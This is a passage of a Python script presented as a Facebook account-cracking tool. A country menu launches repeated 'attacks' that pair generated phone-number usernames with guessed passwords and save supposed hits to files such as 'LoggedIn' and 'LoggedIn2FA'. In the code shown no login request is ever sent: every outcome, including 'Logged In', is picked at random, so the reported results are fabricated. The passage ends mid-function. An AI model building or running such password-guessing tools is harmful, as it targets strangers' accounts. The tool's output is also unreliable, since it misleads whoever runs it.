                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def ARG():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Argentina',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(arg)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def ITAL():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Italy',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(ital)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def NIG():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Nigeria',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(nig)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def GERM():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Germany',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(germ)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def MAL():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Malaysia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(mal)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                
                
                
                
                if CC=='00':
                    time.sleep(0.5)
                    Level()
                    
                if CC=='01' or CC=='1':
                    IND()
                    sys.exit()
                if CC=='02' or CC=='2':
                    US()
                    sys.exit()
                if CC=='03' or CC=='3':
                    CHIN()
                    sys.exit()
                if CC=='04' or CC=='4':
                    INDO()
                    sys.exit()
                    
                if CC=='05' or CC=='5':
                    BRA()
                    sys.exit()
                    
                if CC=='06' or CC=='6':
                    MEX()
                    sys.exit()
                elif CC=='07' or CC=='7':
                    PHIL()
                    sys.exit()
                elif CC=='08' or CC=='8':
                    VT()
                    sys.exit()
                elif CC=='09' or CC=='9':
                    THAI()
                    sys.exit()
                
                elif CC=='10':
                    EG()
                    sys.exit()
                elif CC=='11':
                    BD()
                    sys.exit()
                elif CC=='12':
                    PAK()
                    sys.exit()
                elif CC=='13':
                    COLOM()
                    sys.exit()
                elif CC=='14':
                    UK()
                    sys.exit()
                elif CC=='15':
                    RUS()
                    sys.exit()
                elif CC=='16':
                    TURK()
                    sys.exit()
                elif CC=='17':
                    FR()
                    sys.exit()
                elif CC=='18':
                    ARG()
                    sys.exit()
                elif CC=='19':
                    ITAL()
                    sys.exit()
                elif CC=='20':
                    NIG()
                    sys.exit()
                elif CC=='21':
                    GERM()
                    sys.exit()
                elif CC=='22':
                    MAL()
                    sys.exit()
                else:
                    print(colored('[!] Invalid Option','red'))
                    time.sleep(1)
                    Country()
                
            Country()
        
        def Attack2():
            
            def Country():
                
                
                os.system('clear')
                print(banner)
                col1=['red','blue','yellow','green','cyan']
                color1=random.choice(col1)
                print(colored(f'''{59*equal}\n{59*equal}
                [01]     India
                [02]     United States
                [03]     China
                [04]     Indonesia
                [05]     Brazil
                [06] Mexico
                [07] Philippines
                [08] Vietnam
                [09]         Thailand
                [10]    Egypt
                [11]            Bangladesh
                [12]            Pakistan
                [13]        Colombia
                [14]    United Kingdom
                [15]    Russia
                [16]    Turkey
                [17]            France
                [18]            Argentina
                [19]        Italy
                [20]        Nigeria
                [21]    Germany
                [22]    Malaysia\n{59*equal}\n[00] Back Menu\n{59*equal}''',f'{color1}'))
                C=colored('Country','red',attrs=['bold'])
                CC=input(f'{C}>>')
                col3=['red','blue','yellow','green','cyan','white']
                color3=random.choice(col3)
                if CC=='00':
                    time.sleep(0.5)
                    Level()
                def IND():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('India',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(ind)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:9]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
